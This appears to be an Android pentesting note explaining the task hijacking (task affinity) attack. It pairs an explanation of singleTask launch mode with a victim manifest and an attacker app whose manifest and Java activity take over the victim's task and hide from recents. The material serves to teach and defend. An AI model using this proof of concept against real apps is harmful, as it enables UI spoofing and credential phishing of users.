# Content

# Task Hijacking / Task Affinity Attack
based on [singleTask mode](https://developer.android.com/guide/components/activities/tasks-and-back-stack#TaskLaunchModes) this gives 3 options for android os when an activity with this mode called :

- **If the Activity instance already exists:**
  - the system routes the intent to the existing instance through a call to its `onNewIntent()` method, rather than creating a new instance. Meanwhile all of the other activities on top of it are destroyed. 

- **If the Activity is newly created:**
  - The system creates the activity at the root of a new task
  - or locates the activity on an existing task with the same affinity

the affinity of an app is usually the package name, an attacker can exploit the last behavior to push the new created activity in the same stack of the hacker's activity

## Attack
### Victim App
notice the `android:launchMode="singleTask"`
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.victim.app">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:logo="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SuperSecureApp">
        <activity android:name=".LoggedIn"></activity>
        <activity android:name=".MainActivity" android:launchMode="singleTask">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```


### Atacker App
- made the `taskAffinity` with the victim package name 
- `android:excludeFromRecents` ensures the task is not listed in the recent apps, to hide the attacker's app.
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.hacker.app"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AttackerApp"
        android:taskAffinity="com.victim.app">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>

```

```java
package com.hacker.app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```


### References
- https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html
- https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-task-hijacking
- https://blog.dixitaditya.com/android-task-hijacking?x-host=blog.dixitaditya.com 
